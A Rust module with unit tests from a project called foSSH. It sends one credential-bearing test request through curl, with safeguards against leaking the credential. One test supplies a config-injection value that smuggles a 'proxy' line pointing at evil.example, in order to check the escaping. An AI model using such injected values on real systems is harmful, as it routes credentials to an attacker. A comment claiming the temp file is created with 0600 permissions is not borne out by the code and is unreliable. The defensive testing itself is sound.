//! The only outbound request anything in foSSH ever makes.
//!
//! Deliberately confined to this binary. `fossh-admin::integrations`
//! (storage, validation, redaction) is reachable from `fossh-cgi` and
//! `fossh-fcgi` because they need `data_key` from the same crate; this
//! module is not reachable from either, which is what keeps the ingest
//! path's "zero outbound network access" property true by construction
//! rather than by promise. See ADR-0062.
//!
//! ## Why `curl` rather than an HTTP crate
//!
//! Adding `ureq`/`rustls` for one operator-triggered request would put
//! roughly eighty crates through this project's §3.10 supply-chain gate
//! to do what a tool already installed on every RHEL-family system
//! does. This codebase already shells out to `gpg`, `openssl`, and
//! `sha256sum` for exactly this reasoning. See ADR-0063.
//!
//! ## How the credential is kept out of everything that leaks
//!
//! On Linux `/proc/<pid>/cmdline` is world-readable, so an API key
//! passed as a command-line argument is readable by every local user
//! for the lifetime of the process. `/proc/<pid>/environ` is
//! owner-only, so an environment variable is better — but still
//! visible to anything running as the same user, and inherited by any
//! child. Neither is used here. The key reaches `curl` only through a
//! configuration file fed on **stdin** (`--config -`), which lives in a
//! pipe, is never named in the filesystem, and is never visible in any
//! process listing.
//!
//! Three further flags are load-bearing rather than decorative:
//!
//! - `-q` **must be the first argument** — it is what stops `curl` from
//!   reading `~/.curlrc`, where a `--location` or `--proxy` line the
//!   operator forgot about would silently change where this credential
//!   goes.
//! - redirects are **not** followed. `curl` does not follow them
//!   unless asked, and this deliberately never asks: following a
//!   redirect re-sends the `Authorization` header, and a `302` to an
//!   attacker's host is the standard way to turn a webhook into a
//!   credential exfiltration primitive.
//! - `--proto` / `--proto-redir` pin the set of schemes `curl` will
//!   accept, so a URL that got past validation cannot be turned into a
//!   `file://` or `scp://` fetch by anything downstream.

use std::io::Write;
use std::process::{Command, Stdio};

use fossh_admin::integrations::{Integration, Method, TEST_BODY};
use zeroize::Zeroizing;

/// Wall-clock ceiling on the whole request. Also the real bound on how
/// much a hostile endpoint can send: `--max-filesize` only fires when a
/// `Content-Length` is present, so a chunked response that never ends
/// is stopped by this and not by that.
const MAX_TIME_SECS: u32 = 10;
const CONNECT_TIMEOUT_SECS: u32 = 5;
const MAX_RESPONSE_BYTES: u64 = 65_536;
/// How much of the response body is handed back for display. Enough for
/// a real API error message, far short of anything worth scrolling.
const MAX_BODY_SNIPPET: usize = 2_000;

#[derive(Debug)]
pub struct TestOutcome {
    pub status: u16,
    /// `curl`'s own view of whether the transfer happened at all —
    /// distinct from whether the service liked the credential.
    pub transport_ok: bool,
    pub body_snippet: String,
}

#[derive(Debug)]
pub enum NetError {
    /// No `curl` on `PATH`.
    CurlMissing,
    /// `curl` ran and failed: DNS, TLS, connection refused, timeout.
    /// Carries `curl`'s own message, which is consistently better than
    /// anything this module could synthesise.
    Transport(String),
    Internal(String),
}

impl std::fmt::Display for NetError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            NetError::CurlMissing => write!(
                f,
                "curl is not installed, and the console uses it to reach external services. \
                 Install it with:  sudo dnf install curl"
            ),
            NetError::Transport(m) => write!(f, "{m}"),
            NetError::Internal(m) => write!(f, "{m}"),
        }
    }
}

/// Escapes a value for `curl`'s own configuration-file grammar, in
/// which a double-quoted value understands `\\` and `\"` escapes.
///
/// `fossh_admin::integrations` has already rejected every control
/// character before anything gets stored, so a newline cannot reach
/// this function through a stored integration — but this function does
/// not depend on that being true elsewhere. A newline here would end
/// the config line and let the rest be read as further `curl`
/// directives, which is the same injection shape as CRLF in a header,
/// one layer down.
fn quote_config_value(value: &str) -> Zeroizing<String> {
    let mut out = String::with_capacity(value.len() + 2);
    out.push('"');
    for c in value.chars() {
        match c {
            '\\' => out.push_str("\\\\"),
            '"' => out.push_str("\\\""),
            // Unreachable through a stored integration; encoded rather
            // than passed through so that stays true if this is ever
            // called from somewhere that validates less.
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            other => out.push(other),
        }
    }
    out.push('"');
    Zeroizing::new(out)
}

/// The config file handed to `curl` on stdin. `Zeroizing` because the
/// credential is in it.
fn build_config(integration: &Integration, body_path: &str) -> Zeroizing<String> {
    let (header_name, header_value) = integration.auth.header(integration.api_key());
    let header_line = format!("{header_name}: {}", header_value.as_str());

    let mut cfg = String::new();
    cfg.push_str(&format!(
        "url = {}\n",
        quote_config_value(&integration.endpoint).as_str()
    ));
    cfg.push_str(&format!(
        "request = {}\n",
        quote_config_value(integration.method.as_str()).as_str()
    ));
    cfg.push_str(&format!(
        "header = {}\n",
        quote_config_value(&header_line).as_str()
    ));
    cfg.push_str(&format!(
        "user-agent = {}\n",
        quote_config_value(&format!("foSSH/{}", env!("CARGO_PKG_VERSION"))).as_str()
    ));
    if integration.method == Method::Post {
        cfg.push_str(&format!(
            "data = {}\n",
            quote_config_value(TEST_BODY).as_str()
        ));
        cfg.push_str("header = \"Content-Type: application/json\"\n");
    }
    cfg.push_str(&format!(
        "output = {}\n",
        quote_config_value(body_path).as_str()
    ));
    cfg.push_str("write-out = \"%{http_code}\"\n");
    cfg.push_str(&format!("max-time = {MAX_TIME_SECS}\n"));
    cfg.push_str(&format!("connect-timeout = {CONNECT_TIMEOUT_SECS}\n"));
    cfg.push_str(&format!("max-filesize = {MAX_RESPONSE_BYTES}\n"));
    cfg.push_str("proto = \"=http,https\"\n");
    cfg.push_str("proto-redir = \"=https\"\n");
    cfg.push_str("silent\n");
    cfg.push_str("show-error\n");
    // No `location`: see this module's own doc comment. Spelled out
    // rather than merely omitted so that a later "why doesn't this
    // follow redirects?" lands on the reason instead of on an
    // apparent oversight.
    Zeroizing::new(cfg)
}

/// Replaces any occurrence of the credential in text that is about to
/// be shown to a human.
///
/// Some APIs echo the offending request header back in their own error
/// body. That is their choice; putting the operator's live credential
/// on screen because of it is not.
fn redact(text: &str, secret: &str) -> String {
    if secret.is_empty() {
        return text.to_string();
    }
    text.replace(secret, "<redacted>")
}

pub fn test(integration: &Integration) -> Result<TestOutcome, NetError> {
    // A private temp file for the response body. Created by
    // `mkstemp`-equivalent semantics (`create_new`, 0600) so nothing
    // else can read the response, and removed on every path out.
    let body_path = std::env::temp_dir().join(format!(
        "fossh-agent-probe-{}-{}",
        std::process::id(),
        integration.name
    ));
    let _ = std::fs::remove_file(&body_path);
    let body_path_str = body_path.to_string_lossy().into_owned();

    let config = build_config(integration, &body_path_str);

    // `-q` first, always: it is what makes ~/.curlrc irrelevant.
    let mut child = match Command::new("curl")
        .arg("-q")
        .arg("--config")
        .arg("-")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(c) => c,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Err(NetError::CurlMissing),
        Err(e) => return Err(NetError::Internal(format!("could not run curl: {e}"))),
    };

    {
        let mut stdin = child
            .stdin
            .take()
            .ok_or_else(|| NetError::Internal("curl's stdin was not available".to_string()))?;
        // A write failure here is normal if curl already exited (a
        // rejected config, for instance) — the exit status and stderr
        // below are what actually report the problem, so this is not
        // escalated into a separate error.
        let _ = stdin.write_all(config.as_bytes());
    }

    let output = child
        .wait_with_output()
        .map_err(|e| NetError::Internal(format!("waiting for curl: {e}")))?;

    let body_snippet = read_body_snippet(&body_path, integration.api_key());
    let _ = std::fs::remove_file(&body_path);

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        let message = stderr.trim();
        let message = if message.is_empty() {
            format!("curl exited with {}", output.status)
        } else {
            redact(message, integration.api_key())
        };
        return Err(NetError::Transport(message));
    }

    let printed = String::from_utf8_lossy(&output.stdout);
    let status: u16 = printed.trim().parse().map_err(|_| {
        NetError::Internal(format!(
            "curl reported a status this build could not parse: {:?}",
            printed.trim()
        ))
    })?;

    Ok(TestOutcome {
        // 2xx and 3xx both mean the request was accepted and the
        // credential was not rejected. A 3xx specifically means the
        // endpoint wants to redirect, which this deliberately does not
        // follow — reported honestly rather than chased.
        transport_ok: (200..400).contains(&status),
        status,
        body_snippet,
    })
}

fn read_body_snippet(path: &std::path::Path, secret: &str) -> String {
    let Ok(raw) = std::fs::read(path) else {
        return String::new();
    };
    let text = String::from_utf8_lossy(&raw);
    let redacted = redact(text.trim(), secret);
    if redacted.chars().count() <= MAX_BODY_SNIPPET {
        return redacted;
    }
    let truncated: String = redacted.chars().take(MAX_BODY_SNIPPET).collect();
    format!("{truncated}…")
}

#[cfg(test)]
mod tests {
    use super::*;
    use fossh_admin::integrations::{Auth, Integrations};

    fn one(endpoint: &str, auth: Auth, method: Method, key: &str) -> Integration {
        let mut set = Integrations::default();
        set.add("probe", endpoint, auth, method, key, 0).unwrap();
        set.items.into_iter().next().unwrap()
    }

    #[test]
    fn a_quoted_value_escapes_the_two_characters_curls_parser_treats_specially() {
        assert_eq!(quote_config_value("plain").as_str(), "\"plain\"");
        assert_eq!(
            quote_config_value(r#"has"quote"#).as_str(),
            r#""has\"quote""#
        );
        assert_eq!(
            quote_config_value(r"has\backslash").as_str(),
            r#""has\\backslash""#
        );
    }

    #[test]
    fn a_newline_can_never_end_a_config_line_early() {
        // The injection this escaping exists to stop: a value that
        // closes its own line and opens a new curl directive.
        let escaped = quote_config_value("v\nproxy = \"http://evil.example\"");
        assert!(
            !escaped.contains('\n'),
            "a raw newline survived escaping: {}",
            escaped.as_str()
        );
    }

    #[test]
    fn the_config_never_puts_the_credential_anywhere_but_the_header_line() {
        let integration = one(
            "https://api.example.com/v1/ping",
            Auth::Bearer,
            Method::Get,
            "sk_live_SECRETVALUE1",
        );
        let cfg = build_config(&integration, "/tmp/body");
        let key_lines: Vec<&str> = cfg
            .lines()
            .filter(|l| l.contains("sk_live_SECRETVALUE1"))
            .collect();
        assert_eq!(
            key_lines.len(),
            1,
            "the credential appears on {} config lines, expected exactly the header: {key_lines:?}",
            key_lines.len()
        );
        assert!(key_lines[0].starts_with("header = \"Authorization: Bearer "));
    }

    #[test]
    fn the_config_pins_the_scheme_and_never_asks_for_redirects() {
        let integration = one(
            "https://api.example.com/v1/ping",
            Auth::Bearer,
            Method::Get,
            "sk_live_SECRETVALUE1",
        );
        let cfg = build_config(&integration, "/tmp/body");
        assert!(cfg.contains("proto = \"=http,https\""));
        assert!(cfg.contains("proto-redir = \"=https\""));
        // The absence is the security property, so it is asserted
        // rather than left to be noticed.
        assert!(
            !cfg.lines().any(|l| l.trim() == "location"),
            "following redirects would re-send the Authorization header to a host the operator \
             never configured"
        );
    }

    #[test]
    fn a_post_carries_the_self_describing_body_and_a_get_carries_none() {
        let post = one(
            "https://api.example.com/hook",
            Auth::Header {
                name: "X-Api-Key".to_string(),
            },
            Method::Post,
            "sk_live_SECRETVALUE1",
        );
        let cfg = build_config(&post, "/tmp/body");
        assert!(cfg.contains("request = \"POST\""));
        assert!(cfg.contains("connectivity-test"));
        assert!(cfg.contains("header = \"Content-Type: application/json\""));
        assert!(cfg.contains("header = \"X-Api-Key: sk_live_SECRETVALUE1\""));

        let get = one(
            "https://api.example.com/hook",
            Auth::Bearer,
            Method::Get,
            "sk_live_SECRETVALUE1",
        );
        let cfg = build_config(&get, "/tmp/body");
        assert!(cfg.contains("request = \"GET\""));
        assert!(!cfg.contains("connectivity-test"));
    }

    #[test]
    fn an_echoed_credential_is_redacted_before_it_can_reach_a_screen() {
        let echoed = "401 Unauthorized: header 'Authorization: Bearer sk_live_SECRETVALUE1' \
                      was not recognised";
        let cleaned = redact(echoed, "sk_live_SECRETVALUE1");
        assert!(!cleaned.contains("sk_live_SECRETVALUE1"));
        assert!(cleaned.contains("<redacted>"));
    }

    #[test]
    fn redacting_against_an_empty_secret_does_not_replace_everything() {
        // `str::replace` with an empty pattern inserts the replacement
        // between every character. Guarded, and pinned here.
        assert_eq!(redact("hello", ""), "hello");
    }

    #[test]
    fn a_long_body_is_truncated_on_a_char_boundary() {
        let dir = std::env::temp_dir().join(format!("fossh-agent-snip-{}", std::process::id()));
        std::fs::write(&dir, "é".repeat(MAX_BODY_SNIPPET + 500)).unwrap();
        let snippet = read_body_snippet(&dir, "unused");
        assert!(snippet.chars().count() <= MAX_BODY_SNIPPET + 1);
        assert!(snippet.ends_with('…'));
        std::fs::remove_file(&dir).ok();
    }

    #[test]
    fn a_missing_body_file_reads_as_empty_rather_than_panicking() {
        assert_eq!(
            read_body_snippet(std::path::Path::new("/nonexistent/fossh/probe"), "k"),
            ""
        );
    }

    #[test]
    fn a_real_request_to_a_closed_loopback_port_fails_as_transport_not_as_a_status() {
        // A genuine end-to-end exercise of the curl invocation itself
        // — config generation, stdin handoff, exit-status handling —
        // against a port nothing is listening on. Skipped rather than
        // failed if curl is absent, since that is an environment fact
        // and not a defect in this code.
        let integration = one(
            "http://127.0.0.1:9/ping",
            Auth::Bearer,
            Method::Get,
            "sk_live_SECRETVALUE1",
        );
        match test(&integration) {
            Err(NetError::CurlMissing) => {}
            Err(NetError::Transport(m)) => {
                assert!(
                    !m.contains("sk_live_SECRETVALUE1"),
                    "curl echoed the key: {m}"
                );
            }
            Err(NetError::Internal(m)) => panic!("unexpected internal error: {m}"),
            Ok(o) => panic!(
                "nothing should be listening on port 9, got HTTP {}",
                o.status
            ),
        }
    }

    #[test]
    fn the_probe_leaves_no_body_file_behind() {
        let integration = one(
            "http://127.0.0.1:9/ping",
            Auth::Bearer,
            Method::Get,
            "sk_live_SECRETVALUE1",
        );
        let expected =
            std::env::temp_dir().join(format!("fossh-agent-probe-{}-probe", std::process::id()));
        let _ = test(&integration);
        assert!(
            !expected.exists(),
            "the response-body temp file survived the request"
        );
    }
}
